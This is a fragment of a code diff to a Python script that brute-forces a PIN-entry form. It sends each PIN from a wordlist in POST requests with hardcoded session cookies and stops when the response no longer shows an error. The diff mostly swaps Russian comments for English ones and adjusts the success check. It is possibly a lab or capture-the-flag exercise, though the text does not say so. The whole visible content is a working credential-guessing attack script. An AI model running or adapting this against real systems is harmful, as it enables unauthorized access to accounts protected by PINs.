@@ -8,7 +8,7 @@ cookies = {
     "pwd": "BABYFACE"
 }
 
-# Загрузите список PIN-кодов
+
 with open("pins.txt", "r") as f:
     pins = [line.strip() for line in f if line.strip()]
 
@@ -18,10 +18,10 @@ for pin in pins:
     data = {"code": pin}
     response = requests.post(url, cookies=cookies, data=data)
     
-    # Проверьте условие успеха. Например, если в ответе НЕТ слова "Invalid"
-    if "Incorrect code" not in response.text and "Error" not in response.text:
+    #should check with response
+    if "Incorrect code:" not in response.text and "Error" not in response.text:
         print(f"[+] SUCCESS! Pin found: {pin}")
-        print(response.text[:200]) # Показать начало ответа
+        print(response.text[:200]) 
         sys.exit(0)
     else:
         print(f"[-] Failed with pin: {pin}", end='\r')
